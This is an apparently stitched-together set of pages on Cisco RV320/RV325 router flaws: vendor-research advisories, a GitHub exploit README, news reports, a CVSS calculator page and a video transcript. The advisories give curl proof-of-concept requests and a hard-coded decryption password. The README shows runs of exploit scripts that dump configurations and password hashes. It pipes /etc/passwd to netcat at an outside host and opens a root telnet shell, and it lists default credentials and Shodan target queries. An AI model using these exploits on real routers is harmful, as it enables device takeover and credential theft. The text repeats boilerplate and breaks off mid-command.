Advisory: Cisco RV320 Unauthenticated Configuration Export

RedTeam Pentesting discovered that the configuration of a Cisco RV320
router can still be exported without authentication via the device's web
interface due to an inadequate fix by the vendor.

Details
=======

Product: Cisco RV320 Dual Gigabit WAN VPN Router, possibly others
Affected Versions: 1.4.2.15 through 1.4.2.20
Fixed Versions: none
Vulnerability Type: Information Disclosure
Security Risk: high
Vendor URL: <https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info>
Vendor Status: working on patch
Advisory URL: <https://www.redteam-pentesting.de/advisories/rt-sa-2019-003>
Advisory Status: published
CVE: CVE-2019-1653
CVE URL: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1653>

Introduction
============

"Keep your employees, your business, and yourself productive and
effective. The Cisco RV320 Dual Gigabit WAN VPN Router is an ideal
choice for any small office or small business looking for performance,
security, and reliability in its network."
(from the Cisco RV320 product page [1])

More Details
============

The Cisco RV320 Dual Gigabit WAN VPN Router provides a web-based
configuration interface, which is implemented in various CGI programs in
the device's firmware. Access to this web interface requires prior
authentication using a username and password. Previously, RedTeam
Pentesting identified a vulnerability (rt-sa-2018-002) [2] in the CGI
program:

/cgi-bin/config.exp

By issuing an HTTP GET request to this program, it was possible to
export a router's configuration without providing any prior
authentication. This vulnerability was adressed in firmware version
1.4.2.19 published by Cisco [3].

RedTeam Pentesting discovered that the CGI program in the patched
firmware is still vulnerable. By performing a specially crafted HTTP
POST request, attackers are still able to download the router's
configuration. The user agent "curl" is blacklisted by the firmware and
must be adjusted in the HTTP client. Again, exploitation does not
require any authentication.

Proof of Concept
================

A device's configuration can be retrieved by issuing an HTTP POST request
to the vulnerable CGI program (output shortened):

------------------------------------------------------------------------
$ curl -s -k -A kurl -X POST --data 'submitbkconfig=0' \
  '[https://192.168.1.1/cgi-bin/config.exp'](https://192.168.1.1/cgi-bin/config.exp%26apos);
####sysconfig####
[VERSION]
VERSION=73
MODEL=RV320
SSL=0
IPSEC=0
PPTP=0
PLATFORMCODE=RV0XX

DOMAINNAME=example.com
DOMAINCHANGE=1
USERNAME=cisco
PASSWD=066bae9070a9a95b3e03019db131cd40
[...]
------------------------------------------------------------------------

Workaround
==========

Prevent untrusted clients from connecting to the device's web server.

Fix
===

None

Security Risk
=============

This vulnerability is rated as a high risk as it exposes the device's
configuration to untrusted, potentially malicious parties. By
downloading the configuration, attackers can obtain internal network
configuration, VPN or IPsec secrets, as well as password hashes for the
router's user accounts. Knowledge of a user's password hash is
sufficient to log into the router's web interface, cracking of the hash
is not required. Any information obtained through exploitation of this
vulnerability can be used to facilitate further compromise of the device
itself or attached networks.

CVE-2019-1653/CVE-2019-1652 Exploits For Dumping Cisco RV320 Configurations and getting RCE

Implementations of the CVE-2019-1652 and CVE-2019-1653 exploits disclosed by [Red Team Pentesting GmbH](http://www.redteam-pentesting.de).

I only tested these on an RV320, but according to the [Cisco advisory](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info), the RV325 is also vulnerable.

The following [Shodan](https://shodan.io) queries appear to find them, if you are curious about how many are out there. There seems to be quite a few...

[ssl:RV320](https://www.shodan.io/search?query=ssl%3ARV320)

[ssl:RV325](https://www.shodan.io/search?query=ssl%3ARV325)

[port:161 RV325](https://www.shodan.io/search?query=port%3A161+RV325)

[port:161 RV320](https://www.shodan.io/search?query=port%3A161+RV320)

The vulnerabilities allow for the following:

* Dumping (Plaintext) Configuration File! (includes hashes for the webUI!)
* Dumping (Encrypted) Diagnostic/Debug Files! (including config, and the /etc and /var directories)
* Decrypting the encrypted Diagnostic/Debug Files! (yes, you get /etc/shadow!)
* Post-Authentication Remote Command Injection as root in the webUI!

As an aside, the default creds are cisco:cisco.

## Exploits...

### Config Dumper Exploit...

For the [configuration dump exploit](https://seclists.org/fulldisclosure/2019/Jan/52), just set target, port, ssl on/off, and output directory. It will dump the configuration to there.

```
$ python dump_config.py -t x.x.x.x -p 8443 -s -d output
{+} Sending request to https://x.x.x.x:8443/cgi-bin/config.exp
{*} We seem to have found a valid config! Writing to output/x.x.x.x_8443.conf
$

```

### Debug Data Dumper Exploit...

For the [debug data dumping exploit](https://seclists.org/fulldisclosure/2019/Jan/53), it is the same routine, but the dumped data is larger and encrypted.
You will want to decrypt this using the provided "decrypt.sh" script, or manually using `openssl`. This will give you a tar file.
The debug output not only gets you the config, but also backups of `/etc` and `/var`, and yes, the `/etc/shadow/` file is present.
I'll eventually rewrite the decryption script in Python, but this was a quick kludge.

```
$ python dump_debug.py -t x.x.x.x -p 8443 -s -d output
{+} Sending request to https://x.x.x.x:8443/cgi-bin/export_debug_msg.exp
{*} We seem to have found a valid encrypted config! Writing to output/x.x.x.x_8443.enc
$ ./decrypt.sh output/x.x.x.x_8443.enc
Cisco Encrypted Debug Data Decryption Script!
{+} Decrypting output/x.x.x.x_8443.enc
{+} Plaintext should be at output/x.x.x.x_8443.enc.decrypted.tar.gz...
$

```

Using the creds you get from these (hashed) you can then exploit [CVE-2019-1652](https://seclists.org/fulldisclosure/2019/Jan/54) to execute commands on the device.

A few notes on the "hashing" of the password, before we go any further. On these, in the config file, you will find a variable named PASSWD followed by an md5 hash.
This md5 hash is `md5($password.$auth_key)`, where the auth\_key is a static value you can find by doing a `GET /` and parsing.
There is a seemingly common one that I hardcoded into the RCE exploit as a fallback incase the page parser bullshit regex fails.

### Post-Auth RCE Exploit

CVE-2019-1652 outlines a trivial shell command injection vulnerability, which requires authentication. `exec_cmd.py` implements this, assuming you have valid login creds. "cisco:cisco" is the default, but you could also crack some hashes.

The command injection is blind, so you won't get any output. The environment is an incredibly limited Busybox setup with a crippled netcat, and the boxes are mips64, so I didn't bother writing a reverse-shell exploit this time. You can, however, get command output by doing stuff like `cat /etc/passwd | nc HOST PORT` and having a listener running, or whatever.

You can also inject a command like `telnetd -l /bin/sh -p 1337` and connect to the resultant telnet service, which will serve you up a nice unauthenticated root shell.

Example run of the exploit below:

```
$ python exec_cmd.py -t x.x.x.x -s -p 8443 -U cisco -P cisco -c "cat /etc/passwd | nc x.x.x.x 1337"
{+} Sending request to https://x.x.x.x:8443/ to extract auth key...
{*} Got auth_key value: 1964300002
{+} Login Successful, we can proceed!
{+} Ok, now to run your command: cat /etc/passwd | nc x.x.x.x 1337
{+} We don't get output so... Yeah. Shits blind.
$
# on listener...
$ nc -lp 1337
root:x:0:0:root:/:/bin/admin
nobody:x:0:0:nobody:/nonexistent:/bin/false
_lldpd:x:501:501:_lldpd:/:/bin/sh
cisco:x:0:0:root:/bin:/bin/admin

$

```

### "Full Package" Exploit

So because Cisco, you can actually pass the hash you extract and get a logged in session. So we wrote an exploit that extracts the hash and passes it.
This is called `easy_access.py`. Because the path of the CGI binaries contains a folder named "EasyAccess".

Example run of EasyAccess below...

```
$ python easy_access.py -t x.x.x.x -p 8443 -s -c "telnetd -l /bin/sh -p 1337"
{+} Gonna go grab us a config file...
{+} Sending request to https://x.x.x.x:8443/cgi-bin/config.exp
{*} We seem to have found a valid config!
{+} Extracting Creds...
{+} Got user: cisco
{+} Got password (hash): [redacted]
{+} Sending request to https://x.x.x.x:8443/ to extract auth key...
{*} Got auth_key value: 1964300002
{+} Login Successful, we can proceed!
{+} Ok, now to run your command: telnetd -l /bin/sh -p 1337
{+} We don't get output so... Yeah. Shits blind.

$ telnet x.x.x.x 1337
<snip>

# Hackers are going after Cisco RV320/RV325 routers using a new exploit

Attacks on Cisco routers started hours after the publication of proof-of-concept code on GitHub.

Security researchers have observed ongoing internet scans and exploitation attempts against Cisco [RV320](https://www.cisco.com/c/en/us/products/routers/rv320-dual-gigabit-wan-vpn-router/index.html) and [RV325](https://www.cisco.com/c/en/us/products/routers/rv325-dual-gigabit-wan-vpn-router/index.html) WAN VPN routers, two models very popular among internet service providers and large enterprises.

**Also:**[**Cisco removed its seventh backdoor account**](https://www.zdnet.com/article/cisco-removed-its-seventh-backdoor-account-this-year-and-thats-a-good-thing/)

Attacks started [on Friday](https://twitter.com/bad_packets/status/1088876712933306368), January 25, after security researcher David Davidson published a [proof-of-concept exploit](https://github.com/0x27/CiscoRV320Dump) for two Cisco RV320 and RV325 vulnerabilities.

The vulnerabilities are:

* **CVE-2019-1653** - allows a remote attacker to get sensitive device configuration details without a password.
* **CVE-2019-1652** - allows a remote attacker to inject and run admin commands on the device without a password.

Both vulnerabilities were discovered and privately reported to Cisco by Germany security firm RedTeam Pentesting [[1](https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-002/-cisco-rv320-unauthenticated-configuration-export), [2](https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-003/-cisco-rv320-unauthenticated-diagnostic-data-retrieval), [3](https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-002/-cisco-rv320-unauthenticated-configuration-export)]. Cisco released patches for both issues on Wednesday, January 23 [[1](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info), [2](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject)].

The current consensus is that attackers are using Davidson's proof-of-concept code to retrieve configuration details using CVE-2019-1652 and then using CVE-2019-1653 to run additional commands, taking full control over vulnerable devices.

"I would advise affected users to upgrade to firmware version 1.4.2.20 and change their device passwords immediately," said security researcher Troy Mursch, of Bad Packets LLC, who first spotted the scans on Friday.

"It's likely these routers will be targeted by miscreants for abuse, but to what degree yet is unknown. CVE-2019-1652 allows for further exploitation once the credentials are obtained," Mursch told *ZDNet*.

"I'm in agreement with this guy," Mursch added, pointing *ZDNet* to one of Davidson's tweets.

> yeah basically anyone unpatched is probably fucked. except for the fact the 'wget' on these boxes is broken half the time and its probably beyond your average skid to cross compile their mirai bot for the correct mips64rev2 shit (for now)

Mursch also used BinaryEdge, a search engine for internet-connected devices, to track down all the Cisco RV320 and RV325 routers that are vulnerable to these attacks.

After a night of investigating, the researcher tracked down 9,657 devices --of which 6,247 are Cisco RV320 routers, and the rest, 3,410, are Cisco RV325 routers.

Mursch has built an [interactive map](https://docs.google.com/spreadsheets/d/1ZocV8n4DOmcKJ_ugjjQ_gjIAmDHxT1JBhVxIAdABVyY/edit#gid=1297196434) with the data he obtained, showing location of all infected hosts. The vast majority of these devices are located on the networks of US ISPs.

"Due to the sensitive nature of these vulnerabilities, the IP addresses of the affected Cisco RV320/RV325 routers will not be published publicly. However, the list is freely available for authorized CERT teams to review. We've shared our findings directly with Cisco PSIRT and US-CERT for further investigation and remediation," Mursch wrote in a separate [report](https://badpackets.net/over-9000-cisco-rv320-rv325-routers-vulnerable-to-cve-2019-1653/) published today.

As Mursch pointed out earlier in the article, the simplest way to mitigate these attacks would be to update the Cisco RV320 and RV325 router firmware. Get patchin'!

Cyberattackers are targeting a pair of just-patched vulnerabilities that allow remote unauthenticated information disclosure leading to remote code-execution.

UPDATE

Malicious scanning activity targeting Cisco Small Business RV320 and RV325 Dual Gigabit WAN VPN routers is underway, with a swell of opportunistic probes looking for vulnerable devices ramping up since Friday.

According to Bad Packets Report’s honeypot data, cyberattackers are targeting a pair of just-patched vulnerabilities that allow remote unauthenticated information disclosure ([CVE-2019-1653](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info)) leading to remote code-execution (CVE-2019-1652) on the routers. There are more than 9,000 routers open to the attack, the firm found.

The first vulnerability exists in the web-based management interface for RV320/RV325; a simple GET request for /cgi-bin/config.exp returns full details of the device’s configuration settings, including administrator credentials (the password is hashed though).

“[This] could allow an unauthenticated, remote attacker to retrieve sensitive configuration information,” explained researcher Troy Mursch, in [an advisory](https://badpackets.net/over-9000-cisco-rv320-rv325-routers-vulnerable-to-cve-2019-1653/) published over the weekend. “All configuration details of the RV320/RV325 router are exposed by this vulnerability.”

Bad Packets Report’s own scanning efforts [using BinaryEdge](https://www.binaryedge.io/), which canvassed 15,309 unique IPv4 hosts, determined that 9,657 Cisco RV320/RV325 routers are vulnerable to CVE-2019-1653: Broken down, it works out to 6,247 vulnerable out of 9,852 Cisco RV320 routers scanned; and 3,410 vulnerable out of 5,457 Cisco RV325 routers scanned.

These are mostly located in the United States, Mursch said, though overall, vulnerable devices were found in 122 countries and on the networks of 1,619 different ISPs – making for a significant, global attack surface.

Once a malefactor has gained admin credentials, he or she can further exploit the router after signing in. The CVE-2019-1652 flaw allows an authenticated, remote attacker with administrative privileges on an affected device to execute arbitrary commands. The vulnerability is due to improper validation of user-supplied input.

“An attacker could exploit this vulnerability by sending malicious HTTP POST requests to the web-based management interface of an affected device,” according to Cisco’s [documentation](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1652). “A successful exploit could allow the attacker to execute arbitrary commands on the underlying Linux shell as root.”

A [proof-of-concept](https://github.com/0x27/CiscoRV320Dump) for remote code-execution has been detailed by researcher/grey hat David Davidson, but Mursch noted that there are mitigating circumstances.

“In regards to how the routers are going to be exploited once compromised, it’s not fully known yet,” he told Threatpost. “At this point, I can only confirm threat actors are only taking inventory of vulnerable devices by scraping the leaked configuration files and credentials. The actual damage may be limited due to the capabilities (or lack thereof) noted by David Davidson. Only time will tell.”

Davidson’s tweet explained:

https://twitter.com/info\_dox/status/1089002947076333570

One interesting point to note is that the vulnerability also results in the SSID being leaked.

“This allows attackers to use services such as WiGLE to determine the physical location of the router,” Mursch told Threatpost.

This was also the case in the recent [Orange Livebox vulnerability](https://threatpost.com/19k-orange-livebox-modems-open-to-attack/140376/), Mursch pointed out. That means that an attacker can mount a variety of on-location proximity hacks, and it also allows easier botnet-building given that many admins use the same credentials for the administrative panel as well as the WiFi network — opening the door to more devices to enslave.

The vulnerabilities affect Cisco RV320/RV325 routers running firmware releases 1.4.2.15 and 1.4.2.17. Cisco’s patch should be applied immediately, and administrators should change their devices’ admin and WiFi credentials to thwart any compromise that may have already occurred.

| Common Vulnerability Scoring System (CVSS) Online Calculator, version 3.0 |
| Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X |
| This tool is used to calculate a specific threat/vulnerability's CVSS score. Please select the appropriate options below, click "Calculate Score," and the CVSS score will be displayed. Use of this calculator is subject to [the disclaimer below.](#disclaimer) |
| ---    | |
| Base Parameters |
| Once discovered, analyzed, and catalogued, there are certain aspects of a vulnerability that do not change, assuming the initial information is complete and correct. These immutable characteristics will not change over time, nor in different environments. The base metric group captures the access to and impact on the target.  Attack Vector AV: Local AV: Adjacent AV: Network AV: Physical  Select Attack Vector Parameters  Attack Complexity AC: Low AC: High  Select Attack Complexity Parameters  Privileges Required PR: None PR: Low PR: High  Select Privileges Required Parameters  User Interaction UI: Required UI: None  Select User Interaction Parameters  Scope S: Unchanged S: Changed  Select Scope Parameters  Confidentiality Impact C: None C: Low C: High  Select Confidentiality Impact Parameters  Integrity Impact I: None I: Low I: High  Select Integrity Impact Parameters  Availability Impact A: None A: Low A: High  Select Availability Impact Parameters    Base Score: 7.5 |
| Temporal Parameters |
| As a vulnerability ages, certain intrinsic characteristics will change with time. In many cases, when a vulnerability is first discovered, the number of vulnerable systems will be at or close to its peak, while the availability of exploit and remedial information will be at its lowest point. As time progresses, patch information will become more available and more systems will be fixed as more exploits occur, driving the need for the fix. Eventually, the number of vulnerable systems will reach its low point as remedial information reaches its high point. The CVSS temporal metrics group captures these characteristics of a vulnerability that change over time.  Exploit Code Maturity E: Unproven  E: Proof-of-Concept  E: Functional  E: High  E: Not Defined   Select Exploit Code Maturity Parameters  Remediation Level RL: Official-Fix  RL: Temporary-Fix  RL: Workaround  RL: Unavailable  RL: Not Defined   Select Remediation Level Parameters  Report Confidence RC: Unknown  RC: Reasonable  RC: Confirmed  RC: Not Defined   Select Report Confidence Parameters     Temporal Score: 7.5 |
| Environmental Parameters |
| Different user environments can have an immense bearing on how (or if) a vulnerability affects a given information system and its stakeholders. The CVSS environmental metrics group captures characteristics of vulnerabilities that are tied to system distribution and network environment.  Confidentiality Requirement CR: Low  CR: Medium  CR: Not Defined  CR: High   Select Confidentiality Requirement Parameters  Integrity Requirement IR: Low  IR: Medium  IR: Not Defined  IR: High   Select Integrity Requirement Parameters  Availability Requirement AR: Low  AR: Medium  AR: Not Defined  AR: High   Select Availability Requirement Parameters  Modified Attack Vector MAV: Local  MAV: Adjacent  MAV: Network  MAV: Physical  MAV: Not Defined   Select Modified Attack Vector Parameters  Modified Attack Complexity MAC: Low  MAC: High  MAC: Not Defined   Select Modified Attack Complexity Parameters  Modified Privileges Required MPR: None  MPR: Low  MPR: High  MPR: Not Defined   Select Modified Privileges Required Parameters  Modified User Interaction MUI: Required  MUI: None  MUI: Not Defined   Select Modified User Interaction Parameters  Modified Scope MS: Unchanged  MS: Changed  MS: Not Defined   Select Modified Scope Parameters  Modified Confidentiality MC: None  MC: Low  MC: High  MC: Not Defined   Select Modified Confidentiality Parameters  Modified Integrity MI: None  MI: Low  MI: High  MI: Not Defined   Select Modified Integrity Parameters  Modified Availability MA: None  MA: Low  MA: High  MA: Not Defined   Select Modified Availability Parameters    Environmental Score: 7.5 |

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# [RT-SA-2019-004] Cisco RV320 Unauthenticated Diagnostic Data Retrieval

---

*From*: RedTeam Pentesting GmbH <release () redteam-pentesting de>

*Date*: Wed, 27 Mar 2019 10:56:42 +0100

```
Advisory: Cisco RV320 Unauthenticated Diagnostic Data Retrieval

RedTeam Pentesting discovered that the Cisco RV320 router still exposes
sensitive diagnostic data without authentication via the device's web
interface due to an inadequate fix by the vendor.

Details
=======

Product: Cisco RV320 Dual Gigabit WAN VPN Router, possibly others
Affected Versions: 1.4.2.15 through 1.4.2.20
Fixed Versions: none
Vulnerability Type: Information Disclosure
Security Risk: high
Vendor URL: <https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info>
Vendor Status: working on patch
Advisory URL: <https://www.redteam-pentesting.de/advisories/rt-sa-2019-004>
Advisory Status: published
CVE: CVE-2019-1653
CVE URL: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1653>

Introduction
============

"Keep your employees, your business, and yourself productive and
effective. The Cisco RV320 Dual Gigabit WAN VPN Router is an ideal
choice for any small office or small business looking for performance,
security, and reliability in its network."
(from the Cisco RV320 product page [1])

More Details
============

The Cisco RV320 Dual Gigabit WAN VPN Router provides a web-based
configuration interface, which is implemented in various CGI programs in
the device's firmware. Access to this web interface requires prior
authentication using a username and password. Previously, RedTeam
Pentesting identified a vulnerability (rt-sa-2018-003) [2] in the CGI
program:

/cgi-bin/export_debug_msg.exp

By issuing an HTTP POST request to this program, it was possible to
retrieve various diagnostic information from the device, including its
current configuration. This request did not require any prior
authentication. Cisco adressed this vulnerability in firmware version
1.4.2.19 [3].

RedTeam Pentesting discovered that the CGI program in the patched
firmware is still vulnerable. The user agent "curl" is blacklisted by
the firmware and must be adjusted in the HTTP client. Again,
exploitation does not require any authentication.

Proof of Concept
================

The diagnostic data can be retrieved by issuing an HTTP POST request to
the vulnerable CGI program. OpenSSL is used to decrypt the data with the
hard-coded password "NKDebug12#$%" before unpacking it with tar (output
shortened):

------------------------------------------------------------------------
$ curl -k -A kurl -X POST --data 'submitdebugmsg=1' \
  '[https://192.168.1.1/cgi-bin/export_debug_msg.exp'](https://192.168.1.1/cgi-bin/export_debug_msg.exp%26apos); > debug

$ openssl aes-128-cbc -salt -md md5 -d \
  -k 'NKDebug12#$%' < debug > debug.tgz

$ mkdir output && tar -xf debug.tgz -C output/

$ ls -1 output/
debug_messages.txt
etc.tgz
nk_sysconfig
var.tgz

$ cat output/nk_sysconfig
####sysconfig####
[VERSION]
VERSION=73
MODEL=RV320
SSL=0
IPSEC=0
PPTP=0
PLATFORMCODE=RV0XX
[...]
[SYSTEM]
HOSTNAME=router
DOMAINNAME=example.com
DOMAINCHANGE=1
USERNAME=cisco
PASSWD=066bae9070a9a95b3e03019db131cd40
[...]
------------------------------------------------------------------------

Workaround
==========

Prevent untrusted clients from connecting to the device's web server.

Fix
===

None

Security Risk
=============

This vulnerability is rated as a high risk as it exposes sensitive
diagnostic information, such as the device's configuration, to
untrusted, potentially malicious parties. By retrieving this
information, attackers can obtain internal network configuration, VPN or
IPsec secrets, as well as password hashes for the router's user
accounts. Knowledge of a user's password hash is sufficient to log into
the router's web interface, cracking of the hash is not required. Any
information obtained through exploitation of this vulnerability can be
used to facilitate further compromise of the device itself or attached
networks.

=== Content from www.youtube.com_ab6282e3_20250120_233856.html ===
[00:00] two vulnerabilities and VPN devices you
[00:02] should patch now
[00:03] [Music]
[00:15] Matt can you tell us about router a
[00:18] vulnerability that we should be
[00:20] interested in yeah this one is pretty
[00:21] neat there's a group called bad packets
[00:23] report and they do some interesting
[00:25] research and they have honey pots
[00:28] sitting on the internet looking for
[00:29] stuff that comes by and you know attack
[00:30] attempts and things like that they
[00:32] recently found out that there's a set of
[00:34] bugs actually in these Cisco small
[00:37] business router or VPN devices the RV
[00:40] 325 in the RV 320 set of vulnerabilities
[00:43] that allow remote code execution and the
[00:46] short version of remote code execution
[00:47] is box is totally owned for the most
[00:49] part apparently there's a way you can
[00:51] connect to them and ask them for their
[00:54] configuration and it tells you all the
[00:56] variables included in those variables
[00:58] are the username and the hashed password
[01:00] and you had to be authenticated in order
[01:02] to ask for that kind of stuff you would
[01:03] think so but the other bug is a command
[01:06] injection bug which allows you to
[01:08] execute arbitrary commands so it turns
[01:10] out there's a population of about 9000
[01:13] vulnerable devices between those two
[01:14] models out on the Internet Cisco's
[01:16] acknowledge that this is a vole 'nor
[01:18] ability and they've also a sheep patches
[01:20] right so if you're using one of these at
[01:21] home or in your small business or
[01:23] wherever that may be now is the time to
[01:25] patch because these are both pretty
[01:27] critical bugs this is the kind of
[01:29] vulnerability that you would think would
[01:30] get sort of weeded out during a testing
[01:32] phase a device like this one of them is
[01:34] a bug that should be very relatively
[01:36] easy to find command injection and one
[01:38] of them is a debug feature in a system
[01:41] that was there for tests and should have
[01:43] been removed before I went to production
[01:44] to have two of them you know it's it's
[01:46] quite something first of all there's any
[01:48] information disclosure vulnerability
[01:50] which leads to the remote code execution
[01:52] I think that the remote code execution
[01:55] is helped by it at least in the
[01:57] proof-of-concept they go for that expose
[01:59] information first and then they use it
[02:01] and they go to execution later on so
[02:03] it's sort of a one-two punch with all
[02:04] the information you get you should be
[02:06] able to run lots of commands in a way
[02:07] that they'll do something right I mean
[02:09] yeah I mean that's the whole point of
[02:10] when you call it a
[02:11] code execution like that's it's
[02:13] basically up to the attacker at that
[02:15] point what it is they want to do with
[02:16] the box they're not really constrained
[02:18] anymore which is why it's so critical I
[02:20] mean even if they hadn't had the the
[02:22] remote code execution bug if they had a
[02:24] way to log into this device they'd have
[02:25] the credentials do you said there's a
[02:27] patch of a liberal besides and it said
[02:29] was able to chain the lightweight
[02:31] password yes that's absolutely good case
[02:33] and if you think your device may have
[02:34] been compromised its bested you know
[02:36] okay change the password I would even
[02:38] say restore it to a clean backup
[02:40] configuration if you've got one yeah to
[02:42] protect yourself in this vulnerability
[02:43] if you have one of these devices you can
[02:44] install the patches that cisco has
[02:46] provided it's also a good idea to reset
[02:48] your password on the device and if it
[02:49] were up to me I would ask you to also
[02:51] reset the device to factory settings
[02:53] entirely was a million's device if you
[02:55] were eight thousand devices out there
[02:57] and hopefully you know more and more of
[02:59] those are getting updated every day
[03:01] [Music]

## Cisco RV320 Unauthenticated Diagnostic Data Retrieval

RedTeam Pentesting discovered that the Cisco RV320 router still exposes
sensitive diagnostic data without authentication via the device’s web
interface due to an inadequate fix by the vendor.

### Details

* Product: Cisco RV320 Dual Gigabit WAN VPN Router, possibly others
* Affected Versions: 1.4.2.15 through 1.4.2.20
* Fixed Versions: 1.4.2.22
* Vulnerability Type: Information Disclosure
* Security Risk: high
* Vendor URL: `https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info`
* Vendor Status: fixed version released
* Advisory URL: `https://www.redteam-pentesting.de/advisories/rt-sa-2019-004`
* Advisory Status: published
* CVE: CVE-2019-1653
* CVE URL: `https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1653`

### Introduction

“Keep your employees, your business, and yourself productive and
effective. The Cisco RV320 Dual Gigabit WAN VPN Router is an ideal
choice for any small office or small business looking for performance,
security, and reliability in its network.”
(from the Cisco RV320 product page (<https://www.cisco.com/c/en/us/products/routers/rv320-dual-gigabit-wan-vpn-router/index.html>))

### More Details

The Cisco RV320 Dual Gigabit WAN VPN Router provides a web-based
configuration interface, which is implemented in various CGI programs in
the device’s firmware. Access to this web interface requires prior
authentication using a username and password. Previously, RedTeam
Pentesting identified a vulnerability (rt-sa-2018-003) (<https://www.redteam-pentesting.de/advisories/rt-sa-2018-003>) in the CGI
program:

/cgi-bin/export\_debug\_msg.exp

By issuing an HTTP POST request to this program, it was possible to
retrieve various diagnostic information from the device, including its
current configuration. This request did not require any prior
authentication. Cisco adressed this vulnerability in firmware version
1.4.2.19 (<https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info>).

RedTeam Pentesting discovered that the CGI program in the patched
firmware is still vulnerable. The user agent “curl” is blacklisted by
the firmware and must be adjusted in the HTTP client. Again,
exploitation does not require any authentication.

### Proof of Concept

The diagnostic data can be retrieved by issuing an HTTP POST request to
the vulnerable CGI program. OpenSSL is used to decrypt the data with the
hard-coded password “NKDebug12#$%” before unpacking it with tar (output
shortened):

```
$ curl -k -A kurl -X POST --data 'submitdebugmsg=1' \
  'https://192.168.1.1/cgi-bin/export_debug_msg.exp' > debug

